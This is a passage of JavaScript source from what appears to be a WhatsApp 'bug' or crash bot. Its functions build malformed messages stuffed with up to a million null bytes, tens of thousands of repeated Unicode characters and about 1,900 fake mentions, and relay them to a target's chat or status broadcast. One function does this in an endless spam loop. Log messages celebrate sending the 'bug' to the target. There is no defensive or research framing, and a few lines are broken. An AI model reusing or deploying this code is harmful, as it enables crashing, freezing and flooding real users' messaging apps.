            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    }

    const audioMsg = {
      viewOnceMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileLength: "99999999",
            seconds: 9999,
            ptt: true,
            streamingSidecar: "AAAA",
            mediaKeyTimestamp: "1743848703",
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "3333333333333333@newsletter",
                serverMessageId: 1,
                newsletterName: "Join Group"
              }
            }
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 0xffffff)
                .toString(16)
                .padStart(6, "0"),
            mentionedJid: [
              target,
              ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: ".menu" + "\u0000".repeat(100000),
                      format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: "\u0000".repeat(10000)
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: "\u0000".repeat(10000)
                        },
                        {
                          name: "carousel_message",
                          buttonParamsJson: "\u0000".repeat(10000)
                        },
                        {
                          name: "galaxy_message",
                          buttonParamsJson: "\u0000".repeat(10000)
                        },
                        {
                          name: "cta_url",
                          buttonParamsJson: "\u0000".repeat(10000)
                        },
                        {
                          name: "send_location",
                          buttonParamsJson: "\u0000".repeat(10000)
                        }
                      ],
                      messageParamsJson: "\u0000".repeat(10000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    const msgSticker = generateWAMessageFromContent(target, stickerMsg, {})
    const msgAudio = generateWAMessageFromContent(target, audioMsg, {})

    await sock.relayMessage("status@broadcast", msgSticker.message, {
      messageId: msgSticker.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    })

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    })
  } catch (err) {
    console.error("❌ Error di MediaBlast:", err.message)
  }
}


async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}


        
async function viewblank(sock, target) {
  try {
    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "OVALIUM AMPAS? ",
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: false,
            },
            body: {
              text: "https://wa.me/OVALIUMAMPAS" + "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{}",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                  }),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                  }),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                  }),
                },
              ],
              messageParamsJson: JSON.stringify({ data: "[{".repeat(1000) }), 
            },
            contextInfo: {
              participant: target,
              mentionJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => `1${Math.floor(Math.random() * 50000000)}0@s.whatsapp.net`
                ),
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Date.now() + 1814400000, 
                },
              },
            },
          },
        },
      },
    };

    
    await sock.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target },
    });

    console.log(`Blank Android Terkirim Ke ${target}`);
  } catch (error) {
    console.error(`Blank Eror ❌ ${target}:`, error);
  }
}


async function AudioParams(sock, target, mention = true) {
  try {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Permen Bang?", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Hallo Sayang", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);
  } catch (err) {
    console.error("⚠️ Error AudioParams:", err.message);
  }
}

async function CarouselBlank(sock, target) {
  const Carousel = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "𞋯",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⎋",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"carouselBug\\>𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"CAROUSEL\",\"flow_message_version\":\"9\",\"flow_token\":\"CAROUSEL\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(Carousel), { userJid: target });
  try {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error("Error :", err);
  }
}

async function DelayInsible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "#Xwar Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
            entryPointConversionSource: "groupStatusMessage"
          }
        }
      }
    }
  },
  {
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          { tag: "to", attrs: { jid: target }, content: undefined }
        ]
      }]
    }]
  });

  await sleep(200);

  if (msg) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    }, {});
  }
}

async function xparams(target) {
    console.log("[X-Params] 🚀 Mulai Mengirim Bug Params Sticker");
    await antiSpamDelay(); 
    while (true) {
        const buttonparams = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { 
                            text: "⟅༑", 
                            format: "DEFAULT" 
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        const buttonjson = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "Permen Lolipop" + "𑆿𑆴𑆿".repeat(6000)
                },
                nativeFlowResponseMessage: {
                    name: "button_reply",
                    paramsJson: JSON.stringify({ id: "option_a" })
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        await sock.relayMessage("status@broadcast", buttonparams.message, {
            messageId: buttonparams.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        await sock.relayMessage("status@broadcast", buttonjson.message, {
            messageId: buttonjson.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        const button1 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { 
                            text: "⟅༑", 
                            format: "DEFAULT" 
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        const button2 = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "Permen Lolipop" + "𑆿𑆴𑆿".repeat(6000)
                },
                nativeFlowResponseMessage: {
                    name: "button_reply",
                    paramsJson: JSON.stringify({ id: "option_a" })
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        await sock.relayMessage("status@broadcast", button1.message, {
            messageId: button1.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        await sock.relayMessage("status@broadcast", button2.message, {
            messageId: button2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        console.log("SUKSES SEND BUG SPAM DELAY ANTI LOG OUT");
    }
}

async function delayJson(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: ".bugmenu",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: ".menu"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function RidzView(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
             
              contextInfo: {
                quotedMessage: {
                  conversation: "Ini adalah quoted message"
                }
              },

              
              paymentInviteMessage: {
                amount: 10000,
                currency: "IDR",
                noteMessage: {
                  extendedTextMessage: {
                    text: "Silahkan lakukan pembayaran"
                  }
                }
              },

              
              carouselMessage: {
                cards: [
                  {
                    header: {
                      title: "Card 1",
                      subtitle: "Item Pertama"
                    },
                    body: {
                      text: "Deskripsi item 1 di carousel"
                    }
                  },
                  {
                    header: {
                      title: "Card 2",
                      subtitle: "Item Kedua"
                    },
                    body: {
                      text: "Deskripsi item 2 di carousel"
                    }
                  }
                ]
              }
            }
          }
        }
      }),
      {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log("Efci terkirim!");

  } catch (err) {
    console.log("❌ Error:", err);
  }
}


async function LottieSticker(sock, target) {
  const Lottie = generateWAMessageFromContent( target,
    proto.Message.fromObject({
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Hu97Uc0XAUv82l507qXZfYF6dlrIB0/GKdB/nRvYpZw=",
            fileEncSha256: "YxrC0SoMBHP3msQt7SBUQepYDHH+l+PXfp1Nam7OhXo=",
            mediaKey: "Pbjsi5FmJ6PaTIHxd3MHS/i6WN/PKDHjFv/jbuaKM28=",
            mimetype: "application/was",
            height: 9999,
            width: 9999,
            directPath: "/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0",
            fileLength: "13801",
            mediaKeyTimestamp: "1755002437",
            isAnimated: true,
            stickerSentTs: "1755002439632",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              statusAttributionType: 2,
              forwardedAiBotMessageInfo: {
                botName: "Meta",
                botJid: "13135550002@s.whatsapp.net",
                creatorName: "Xatanical"
              }
            }
          }
        }
      }
    }), { participant: { jid: target } });

  await sock.relayMessage(target, Yjqx.message, {
    messageId: Lottie.key.id
  });
}

async function CycsixBrinxtaz(sock, target, mention) {
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " ", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
